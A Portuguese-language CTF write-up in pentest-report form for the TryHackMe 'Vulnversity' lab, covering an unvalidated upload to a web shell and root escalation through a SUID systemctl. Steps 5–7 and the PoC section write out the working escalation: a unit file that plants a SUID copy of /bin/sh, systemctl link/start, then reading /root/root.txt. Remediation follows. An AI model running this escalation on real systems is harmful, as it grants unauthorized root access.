
---
# Report — Máquina: `<Vulnversity>` — `<10.201.40.176>`

- **Fonte:** THM
    
- **Data:** 2025-10-17
    
- **Autor:** Enrico Moreno
    
- **Nível:** Easy
    
- **Tempo gasto:** 3h
    

---

## 1) Executive summary (1–3 linhas)
Encontrada falha de upload não validado em formulário web (`http://10.201.40.176:3333/internal`) que permitiu upload de payload e execução de código, resultando em **escalada de privilégios via /bin/systemctl SUID**. **Severidade:** Alta. **Ação imediata:** isolar o host e bloquear o endpoint de upload até correção.

---

## 2) Escopo

- **Alvo(s) testados:** `http://10.201.40.176:3333/internal`
    
- **Ferramentas autorizadas:** Kali local, Nmap, Gobuster

- **Limitações:** testes limitados ao laboratório/CTF; nenhuma ação em sistemas reais.

---

## 3) Metodologia aplicada

Resumo das fases aplicadas:

- Recon (nmap, gobuster)
    
- Enumeração (endpoints, diretórios, serviços)
    
- Análise de vulnerabilidades (manual + Burp)
    
- Geração de PoC (upload + execução)
    
- Pós-exploração (verificação de SUID, criação de shell SUID e leitura de /root/root.txt)
    
- Reporting
    

---

## 4) Achado principal (Privilege Escalation via systemctl SUID)

- **Vulnerabilidade:** `systemctl` com bit SUID explorável → privilege escalation (root).
    
- **Causa raiz:** binário `/bin/systemctl` possui bit SUID e aceita iniciar unit files colocados pelo usuário (ex.: em `/tmp`), permitindo execução de comandos como root.
    
- **Local / Endpoint de entrada:** upload mal validado em `http://10.201.40.176:3333/internal` → execução inicial como `www-data`.
    
- **Prova curta (PoC):** criação de unit file em `/tmp`, `systemctl link` + `systemctl start` → criação de `/tmp/sh` com bit SUID e execução como root.
    
- **Flag / Artefato:** `REDACTED` (conteúdo de `/root/root.txt`).

---

## 5) Evidências / PoC (resumo)

### PoC — unit file e escalada (executado a partir da conta `www-data`)

**1) Conteúdo do unit file criado:**

```
cat /tmp/exploit.service
[Unit] 
Description=Exploit

[Service] Type=simple 
ExecStart=/bin/sh -c 'cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh
```

**2) Registrar e iniciar o service com systemctl SUID:**

`/bin/systemctl link /tmp/exploit.service # Output: # Created symlink /etc/systemd/system/exploit.service -> /tmp/exploit.service.  # iniciar /bin/systemctl start exploit.service`

**3) Resultado: shell SUID criado**

```
ls -l /tmp/sh # -rwsr-xr-x 1 root root 129816 Oct 17 18:26 /tmp/sh 
/tmp/sh -p 
whoami # root  
id # uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data) 
cat /root/root.txt
```

> Evidências adicionais (screenshots / logs / Burp export) anexadas na pasta `evidence/` (veja Apêndice).

---

## 6) Impacto & Severidade (Alta)

- **Severidade:** Alta (RCE + Privilege Escalation → root).
    
- **Justificativa:** vulnerabilidade permite execução remota de comandos pelo serviço web e, devido a presença de `systemctl` com SUID explorável, possibilita tomada total do sistema (root), comprometendo confidencialidade, integridade e disponibilidade.

---

## 7) Reproduzir

1. Recon:
    

`nmap -sV -v 10.201.40.176 -oN nmap_vulnversity.txt`

2. Enumeração web:
    

`gobuster dir -u http://10.201.40.176:3333 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -o gobuster_results_vulnversity.txt`

3. Encontrar formulário de upload em `/internal` e enviar payload malicioso (ex.: web shell / script que executa comandos). Evidência do upload e execução obtida via Burp / curl (detalhes nos anexos).
    
4. Após obter shell como `www-data`, confirmar SUID:
    

`ls -l /bin/systemctl # -rwsr-xr-x ... /bin/systemctl`

5. Criar `exploit.service` em `/tmp` com conteúdo:
    

```
[Unit] 
Description=Exploit  
[Service] 
Type=simple 
ExecStart=/bin/sh -c 'cp /bin/sh /tmp/sh; chmod 4755 /tmp/sh`
```

6. Registrar e iniciar service:
    

`/bin/systemctl link /tmp/exploit.service /bin/systemctl start exploit.service`

7. Verificar `/tmp/sh` e executar para ganhar shell com EUID=root:
    
```
ls -l /tmp/sh 
/tmp/sh -p 
whoami 
cat /root/root.txt
```

---

## 8) Recomendações

- **Isolar o host** (retirar da rede/segmento de produção).
    
- **Bloquear o endpoint de upload** (`/internal` ou porta 3333) até aplicar correções.
    
- **Remover/remediar o arquivo de exploit** (ver Seção 9 para comandos).
    
- **Auditar outros hosts** para verificar presença de `/bin/systemctl` com bit SUID — buscar SUIDs anômalos..
---

## 9) Recomendações técnicas (passo-a-passo)

**Atenção:** execute as mudanças em ambiente de teste/staging antes de produção. As ações abaixo requerem acesso root no servidor.

### A) Corrigir a vulnerabilidade de upload (aplicação web)

1. **Remover funcionalidade de upload** temporariamente ou aplicar bloqueio por WAF enquanto corrige.
    
2. **Validar e filtrar arquivos no servidor:**
    
    - Verifique cabeçalhos `Content-Type` e faça validação por _whitelist_ (ex.: apenas imagens PNG/JPEG se realmente necessário).
        
    - Inspecione conteúdo do arquivo (não confiar apenas em extensão).
        
    - Limite tamanho máximo de upload.
        
3. **Armazenamento seguro:**
    
    - Salve uploads **fora do webroot** (diretório não servido pelo servidor web).
        
    - Utilize nomes de arquivo randomizados e sem execução (`chmod 660`, owner = app user).
        
4. **Remova executáveis de diretórios de upload** e configure o mount de `/tmp` / diretório de uploads com `noexec,nosuid,nodev` se aplicável.
    
5. **Escaneie uploads por malware** (AV) ou regras de inspeção.
    

### B) Corrigir o vetor systemctl SUID

> Ideal: `systemctl` **não** deve ter bit SUID em instalações normais. Verifique porque `/bin/systemctl` está SUID — isso é anômalo.

1. **Remover SUID do binary (se apropriado):**
    

```
# Executar como root chmod u-s /bin/systemctl 
# Verificar 
ls -l /bin/systemctl 
# Saída esperada: -rwxr-xr-x (sem 's')
```

> OBS: antes de alterar binários do sistema, confirme política da distro / dependências. Em installs padrão, systemctl não é SUID; remover SUID costuma ser correto.

2. **Remover registros de serviço criados por atacantes:**
    

```
rm -f /tmp/exploit.service
rm -f /etc/systemd/system/exploit.service
systemctl daemon-reload
systemctl reset-failed
```

3. **Reverter artefatos:**
    

`rm -f /tmp/sh`

4. **Aumentar restrições de criação de unit files:**
    
    - Assegurar que apenas root/admin possa escrever em `/etc/systemd/system/` (padrão).
        
    - Evitar que usuários não confiáveis criem unit files em locais que `systemctl` aceite (documentar políticas e ajustar PAM/SELinux/AppArmor se necessário).
        
    - Avaliar políticas do systemd (ex.: `ProtectSystem`, `ProtectHome`, `PrivateTmp`) para serviços web.
        
5. **Hardening / kernel options (opcionais):**
    
    - Montar `/tmp` com `noexec,nosuid,nodev` (se compatível).
        
    - Habilitar AppArmor / SELinux profile para o processo web.
        
    - Monitorar SUID binaries: `find / -perm -4000 -type f` e auditar mudanças.
        

### C) Pós-correção e auditoria

1. **Aplicar patches e atualizar pacotes:** `apt update && apt upgrade` (ou gerenciador da distro).
    
2. **Rever contas e credenciais** (se houver sinais de persistência): checar `authorized_keys`, cronjobs, usuários criados.
    
3. **Logs & forense:** coletar logs do tempo do incidente (`/var/log/*`, `journalctl`) e analisar técnicas usadas.
    
4. **Retest:** executar um teste de intrusão de verificação (reproduzir PoC) para confirmar a correção.
    
5. **Política:** adicionar checagem de SUIDs e monitoramento contínuo.

---

## 10) Apêndice técnico

### Nmap (comando)

`nmap -sV -v 10.201.40.176 -oN nmap_vulnversity.txt`

### Saídas

- Nmap: ![](nmap_vulnversity.txt)
- Gobuster: ![](gobuster_results_vulnversity.txt)
- Burp: ![](burp_log_vulnverity.xml)
(Arquivos adicionados à pasta `Writeups_Publicos/evidence/` para verificação.)
---

## 11) Lições aprendidas / follow-up

- Revisar e praticar vetores SUID (como `systemctl`, `pkexec`, outros binários com setuid).
    
- Priorizar controle de upload e validação de entrada em aplicações web.
    
- Incluir checagem de SUIDs e configurações anômalas (ex.: `systemctl` SUID) na rotina de hardening.
    
- Agendar retest após correção.

---
